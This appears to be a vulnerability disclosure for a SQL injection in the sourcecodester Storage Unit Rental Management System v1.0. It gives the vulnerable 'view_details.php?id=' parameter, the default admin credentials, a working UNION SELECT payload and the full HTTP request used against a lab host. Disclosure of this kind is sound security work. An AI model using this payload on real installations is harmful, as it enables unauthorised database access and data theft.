# Storage Unit Rental Management System v1.0 by sourcecodester has SQL injection 2

BUG_Author: Liu Lanling

Login account: admin/admin123

vendors: https://www.sourcecodester.com/php/14932/storage-unit-rental-management-system-using-php-free-source-code.html

The program is built using the xmapp-php8.1 version

Vulnerability File: /storage/admin/tenants/view_details.php

Vulnerability location: /storage/admin/tenants/view_details.php?id=, id

dbname = storage_db

[+] Payload: /storage/admin/tenants/view_details.php?id=0%27%20union%20select%201,database(),3,4,5,6,7,8,9,10--+ // Leak place ---> id

```sql
GET /storage/admin/tenants/view_details.php?id=0%27%20union%20select%201,database(),3,4,5,6,7,8,9,10--+ HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=30ohdkf99du0vfp79d5hmk7701
Connection: close


```

<img width="1023" height="707" alt="image" src="https://github.com/user-attachments/assets/88266afb-8fe4-4819-b27b-39de0f85d6e5" />

